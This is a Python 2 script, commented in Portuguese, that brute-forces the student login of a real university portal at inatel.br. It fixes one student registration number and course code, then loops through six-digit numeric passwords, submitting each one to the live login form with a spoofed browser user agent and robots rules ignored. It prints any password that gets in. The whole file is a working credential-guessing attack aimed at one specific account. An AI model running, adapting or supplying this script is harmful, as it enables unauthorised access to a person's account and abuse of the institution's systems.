#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

# Dependencias
# apt install python-mechanize ou apt install python2-mechanize
# apt install python-bs4 ou apt install python2-bs4

'''
1 - Engenharia Elétrica
2 - Engenharia da Computação
12 - Engenharia de Telecomunicações
6 - Engenharia Biomédica
24 - Engenharia de Controle e Automação
5 - Tec. em Redes de Computadores
7 - Tec. em Automação Industrial
21 - Tec. em Gestão de Telecomunicações
31 - Curso de Aluno Especial
'''

from mechanize import Browser
from bs4 import BeautifulSoup


def verify(curso, matr, senha):
    URL = "https://siteseguro.inatel.br/PortalAcademico/WebLogin.aspx"

    br = Browser()
    br.set_handle_robots(False)
    br.open(URL)

    br.select_form('aspnetForm')
    br.addheaders = [('User-agent',
                      'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) '
                      'Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    br.form['ctl00$Corpo$TabAcessoLogin$TabAluno$LogOn$tbMatricula'] = matr
    br.form['ctl00$Corpo$TabAcessoLogin$TabAluno$LogOn$Password'] = senha
    br.form['ctl00$Corpo$TabAcessoLogin$TabAluno$LogOn$dropSubCurso'] = [curso]

    response = br.submit(name='ctl00$Corpo$TabAcessoLogin'
                              '$TabAluno$LogOn$LoginButton')

    dados = response.read()

    soup = BeautifulSoup(dados, 'html.parser')

    try:
        print(soup.find(id='ctl00_Corpo_lblErro'))
        if soup.find(id='ctl00_Corpo_lblErro') is None:
            print("Senha: %s" % senha)
        else:
            print("Quebrando ==> %s" % senha)
    except:
        print("Erro na biblioteca, verifique as dependencias! ==> %s" % senha)

for x in range(152630, 9999999):
    matr = '9030'
    senha = ('{0:06}'.format(x))
    curso = '12'

    # print(matr, senha, curso)

    verify(curso, matr, senha)
